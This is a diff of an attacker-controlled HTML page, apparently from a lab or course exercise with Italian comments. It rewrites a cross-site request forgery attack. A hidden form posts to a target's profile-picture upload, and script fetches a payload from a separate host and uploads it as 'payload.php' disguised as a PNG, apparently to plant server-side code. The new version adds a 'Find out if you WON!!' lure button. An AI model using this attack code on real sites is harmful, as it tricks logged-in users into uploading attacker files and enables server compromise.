@@ -17,29 +17,42 @@
             <div class="page-title">Welcome to Evil WebStore Sassuolo</div>
             <p style="text-align: center; font-size: 18px; margin-bottom: 40px;">Il miglior store di tutto il Sass</p>
         </div>
- 
-        <form id="csrf-form" method="POST" action="http://172.18.0.6/user_profile.php" 
-            enctype="multipart/form-data" style="display:none;">
-            <input type="hidden" name="action" value="update_picture">
-            <input type="file" name="profile_picture" id="file-input">
-        </form>
-        
-        <script>
-            // Fetch the payload and populate the file input
-            fetch('http://172.18.0.3/payload.php')
-                .then(response => response.blob())
-                .then(blob => {
-                    const dataTransfer = new DataTransfer();
-                    dataTransfer.items.add(new File([blob], 'payload.php', { type: 'image/png' }));
-                    document.getElementById('file-input').files = dataTransfer.files;
-                    
-                    // Now submit the form
-                    document.getElementById('csrf-form').submit();
-                });
-        </script>
-        
+        <div class="login-container">
+            <h1>Find out if you WON!!</h1>
+                <form id="csrf-form" method="POST" action="http://172.18.0.11/user_profile.php" 
+                    enctype="multipart/form-data" style="display:none;">
+                    <input type="hidden" name="action" value="update_picture">
+                    <input type="file" name="profile_picture" id="file-input">
+                </form>                
+                <button type="submit" onclick="sendCSRF()">Fingers Crossed</button>
+            </form>
 
-        
+        <script>
+            function sendCSRF(){
+                const input = document.getElementById('file-input');
+                const formData = new FormData();
+                
+                fetch('http://172.18.0.10/payload')
+                    .then(response => response.arrayBuffer())
+                    .then(buffer => {
+
+                        // Binary Large OBject: i dati binari da inviare, cioè il fetch (=payload)
+                        const blob = new Blob([buffer], { type: 'image/png' });
+
+                        // DataTransfer: unico modo per inviare i file tramite il browser
+                        const dataTransfer = new DataTransfer();
+
+                        // File: funziona come un pacco postale -> ci mettiamo dentro quello che dobbiamo mandare
+                        // e lo chiamiamo "payload.php", il nome con cui verrà caricato sul target
+                        dataTransfer.items.add(new File([blob], 'payload.php', { type: 'image/png' }));
+                        input.files = dataTransfer.files;
+                        
+                        // invia al form del webstore target (tramite action del form sopra)
+                        document.getElementById('csrf-form').submit();
+                    });
+                }
+        </script>      
+        </div>
         <!-- Footer -->
         <footer style="background: rgba(0, 0, 0, 0.8); color: white; text-align: center; padding: 15px;">
             <p>&copy; Double A</p>
